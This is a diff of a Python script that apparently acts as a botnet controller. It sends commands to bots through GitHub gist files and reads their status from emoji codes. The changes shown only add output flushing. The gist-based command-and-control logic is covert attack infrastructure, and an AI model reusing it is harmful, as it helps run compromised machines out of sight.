@@ -110,10 +110,8 @@ def send_command(gist_api, cmd, filename, data=None, debug=True):
     """
     content = get_raw(gist_api, filename)
     if content is None:
-        if debug: print("\nERR: EXIT {} COMMAND ({} does not exists)".format(cmd, filename), file=sys.stderr)
+        if debug: print("\nERR: EXIT {} COMMAND ({} does not exists)".format(cmd, filename), file=sys.stderr, flush=True)
         return False
-
-    # if debug: print("{} {} EXECUTING".format(cmd, filename), file=sys.stderr)
 
     # ----- Update status and command -----
     content_split = content.split('\n')
@@ -131,7 +129,7 @@ def send_command(gist_api, cmd, filename, data=None, debug=True):
         content_split[-1] = new_last_url
 
     update_gist(gist_api, filename, "\n".join(content_split))
-    if debug: print("{} {} COMMAND SEND".format(cmd, filename), file=sys.stderr)
+    if debug: print("{} {} COMMAND SEND".format(cmd, filename), file=sys.stderr, flush=True)
     return True
 
 
@@ -145,23 +143,23 @@ def check_response(gist_api, filename, time_to_wait=10):
     :param time_to_wait:
     :return: Bool if bot responded
     """
-    print("WAITING FOR RESPONSE", file=sys.stderr, end="")
+    print("WAITING FOR RESPONSE", file=sys.stderr, end="", flush=True)
     while time_to_wait > 0:
-        print(".", file=sys.stderr, end="")
+        print(".", file=sys.stderr, end="", flush=True)
         content = get_raw(gist_api, filename)
         status = content.split('\n')[1].split("cuteness")[-1].strip()
         if status in emojis.status_code['success']:
-            print(file=sys.stderr)
+            print(file=sys.stderr, flush=True)
             return True
         elif status in emojis.status_code['error']:
-            print("\nERR: Command execution failed", file=sys.stderr)
+            print("\nERR: Command execution failed", file=sys.stderr, flush=True)
             return True     # As we still want to display output
 
-        print(".", file=sys.stderr, end="")
+        print(".", file=sys.stderr, end="", flush=True)
         time.sleep(1)
         time_to_wait -= 1
 
-    print("\nERR: Bot did not respond", file=sys.stderr)  # Do nothing as bot will be removed when pong
+    print("\nERR: Bot did not respond", file=sys.stderr, flush=True)  # Do nothing as bot will be removed when pong
     return False
 
 
